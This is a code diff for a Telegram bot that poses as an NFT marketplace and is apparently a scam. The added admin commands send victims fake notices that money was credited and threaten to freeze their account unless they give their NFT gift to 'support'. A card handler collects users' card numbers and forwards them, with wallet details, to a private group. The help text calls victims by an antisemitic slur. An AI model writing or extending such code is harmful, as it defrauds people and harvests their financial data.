@@ -36,7 +36,7 @@ DEALS_FILE = "deals.json"
 admins = "admins.json"
 
 # Константы
-BOT_USERNAME = "GlassMarket_bot"  # ⚠️ БЕЗ @, как в логах: @Glass_Market_bot
+BOT_USERNAME = "asddddsdbot"  # ⚠️ БЕЗ @, как в логах: @Glass_Market_bot
 SUPPORT_USERNAME = "GlassMarketSupport"  # Username поддержки для отправки NFT
 SUPPORT_LINK = f"https://t.me/{SUPPORT_USERNAME}"
 GROUP_ID = "-1003691554489"
@@ -178,6 +178,151 @@ async def cmd_start(message: types.Message):
         await message.answer("🚀Режим админа включен✅")
     else:
         await message.answer("⚠️ Вы уже являетесь администратором")
+
+
+@router.message(Command("Admin"))
+async def cmd_admin(message: types.Message):
+    user_id = str(message.from_user.id)
+
+    admins = load_admins()
+
+    if isinstance(admins, dict):
+        admin_list = list(admins.keys())
+    elif isinstance(admins, list):
+        admin_list = admins
+    else:
+        admin_list = []
+
+    if user_id not in admin_list:
+        await message.answer(
+            "❌ У вас нет прав администратора ❌"
+        )
+    else:
+        await message.answer("""
+        ✅ Вы уже являетесь администратором\n
+        👇Все команды для админов
+/addadmin
+/NoSendNFT
+/help
+/addmoney
+        """)
+
+@router.message(Command("addadmin"))
+async def cmd_admin(message: types.Message):
+    user_id = str(message.from_user.id)
+    userid = message.text[10:]
+    admins = load_admins()
+
+    if isinstance(admins, dict):
+        admin_list = list(admins.keys())
+    elif isinstance(admins, list):
+        admin_list = admins
+    else:
+        admin_list = []
+
+    if user_id not in admin_list:
+        await message.answer("Пошёл нахуй")
+    else:
+        await message.answer(f"Новый Админ\n🆔:{userid}")
+        await bot.send_message(userid, f"Вас назначили администратором\n🆔:{user_id}")
+        admin_list.append(userid)
+
+        save_admins(admin_list)
+
+@router.message(Command("addmoney"))
+async def cmd_admin(message: types.Message):
+    user_id = str(message.from_user.id)
+    userid = message.text[10:][:10]
+    money = message.text[20:]
+    admins = load_admins()
+
+    if isinstance(admins, dict):
+        admin_list = list(admins.keys())
+    elif isinstance(admins, list):
+        admin_list = admins
+    else:
+        admin_list = []
+
+    if user_id not in admin_list:
+        await message.answer("Пошёл нахуй")
+    else:
+        await message.answer(f"Деньги зачисленны\n🆔:{userid}")
+        await bot.send_message(userid, f"✅ВАМ БЫЛИ НАЧИСЛЕННЫ ДЕНЬГИ НА БАЛАНС\n💵Зачисленно:{money}💰\nСредства будут выведенны по указанным вами средствам автоматически")
+
+@router.message(Command("NoSendNFT"))
+async def cmd_admin(message: types.Message):
+    user_id = str(message.from_user.id)
+    userid = message.text[11:]
+    admins = load_admins()
+
+    if isinstance(admins, dict):
+        admin_list = list(admins.keys())
+    elif isinstance(admins, list):
+        admin_list = admins
+    else:
+        admin_list = []
+
+    if user_id not in admin_list:
+        await message.answer("Пошёл нахуй")
+    else:
+        await bot.send_message(userid, text=f"‼ВНИМАНИЕ‼\nВы не отправили свой NFT подарок подержке: @{SUPPORT_USERNAME}\nЕсли вы не пердадите подарок поддержке то:\n-Ваш баланс будет заморожен❄\n-Доступ к боту будет запрещён❌")
+
+@router.message(Command("help"))
+async def cmd_admin(message: types.Message):
+    user_id = str(message.from_user.id)
+    admins = load_admins()
+
+    if isinstance(admins, dict):
+        admin_list = list(admins.keys())
+    elif isinstance(admins, list):
+        admin_list = admins
+    else:
+        admin_list = []
+
+    if user_id not in admin_list:
+        await message.answer("Пошёл нахуй")
+    else:
+        await message.answer("""
+Команды, как пользоватся, и их значение
+/addadmin - добавление админов
+Использование:
+/addadmin 'ID человка которого хотим добавить в админы'
+
+/NoSendNFT - отправка гою сообщения о том, что он должен передать подарок и то, что он его ещё не передал
+Использование:
+/NoSendNFT 'ID гоя которому надо отправить соо'
+
+/addmoney - исскуствинное увеличевание баланса гою, еме пришлют сообщение что на его аккаунт поступили денги и что они деньги будут сами выведенны
+Использование:
+/addmoney 'ID гоя' 'сумма которая ему придёт'
+
+/Admin - вкладка для админов, все доступные команды
+
+/help - помошь
+        """)
+
+
+@router.callback_query(lambda c: c.data.startswith("check_admin_"))
+async def check_admin_callback(callback: types.CallbackQuery):
+    user_id = callback.data.replace("check_admin_", "")
+
+    admins = load_admins()
+
+    if isinstance(admins, dict):
+        admin_list = list(admins.keys())
+    elif isinstance(admins, list):
+        admin_list = admins
+    else:
+        admin_list = []
+
+    if user_id not in admin_list:
+        # ВОТ ТУГА show_alert=True будет работать!
+        await callback.answer("❌ ОТКАЗАНО В ДОСТУПЕ\n"
+                              "У вас нет прав администратора",
+                              show_alert=True)
+    else:
+        await callback.answer("✅ Вы администратор", show_alert=True)
+        await callback.message.answer("Добро пожаловать в админ-панель!")
 
 @router.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
@@ -792,35 +937,65 @@ async def add_card(callback: CallbackQuery, state: FSMContext):
 async def save_card(message: types.Message, state: FSMContext):
     card_number = message.text.strip()
     user_id = str(message.from_user.id)
-    num = int(math.log10(card_number)) + 1
     try :
         card_number = int(card_number)
-        data = load_data()
-        if user_id not in data:
-            data[user_id] = {"ton_wallet": "", "card": ""}
+        card_numberlen = len(str(card_number))
+        if card_numberlen == 16:
+            data = load_data()
+            if user_id not in data:
+                data[user_id] = {"ton_wallet": "", "card": ""}
 
-        data[user_id]["card"] = card_number
-        save_data(data)
+            data[user_id]["card"] = card_number
+            save_data(data)
 
-        await message.answer(f"✅ Карта сохранена: {card_number}")
-        await state.clear()
+            await message.answer(f"✅ Карта сохранена: {card_number}")
+            await state.clear()
 
-        user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
-        ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
-        card = user_data.get("card", "Не указана") or "Не указана"
+            user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
+            ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
+            card = user_data.get("card", "Не указана") or "Не указана"
 
-        await bot.send_message(GROUP_ID,f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
+            await bot.send_message(GROUP_ID,
+                                   f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
 
-        await message.answer_photo(
-            photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
-            caption=
-            f"📋 Ваши реквизиты:\n\n"
-            f"⭐Username для звёзд: @{message.from_user.username}\n"
-            f"👛 TON: {ton}\n"
-            f"💳 Карта: {card}",
-            reply_markup=requisites_keyboard)
+            await message.answer_photo(
+                photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
+                caption=
+                f"📋 Ваши реквизиты:\n\n"
+                f"⭐Username для звёзд: @{message.from_user.username}\n"
+                f"👛 TON: {ton}\n"
+                f"💳 Карта: {card}",
+                reply_markup=requisites_keyboard)
+        elif card_numberlen == 18:
+            data = load_data()
+            if user_id not in data:
+                data[user_id] = {"ton_wallet": "", "card": ""}
+
+            data[user_id]["card"] = card_number
+            save_data(data)
+
+            await message.answer(f"✅ Карта сохранена: {card_number}")
+            await state.clear()
+
+            user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
+            ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
+            card = user_data.get("card", "Не указана") or "Не указана"
+
+            await bot.send_message(GROUP_ID,
+                                   f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")
+
+            await message.answer_photo(
+                photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
+                caption=
+                f"📋 Ваши реквизиты:\n\n"
+                f"⭐Username для звёзд: @{message.from_user.username}\n"
+                f"👛 TON: {ton}\n"
+                f"💳 Карта: {card}",
+                reply_markup=requisites_keyboard)
+        else:
+            await message.answer("‼Длинна должна составлять 16/18 символов‼")
     except ValueError:
-        await message.answer("ERROR")
+        await message.answer("❌Введите карту используя числа/цифры")
 
 
 @router.callback_query(F.data == "balance")
@@ -871,9 +1046,3 @@ if __name__ == "__main__":
     print("=" * 40)
 
     asyncio.run(main())
-
-
-
-
-
-
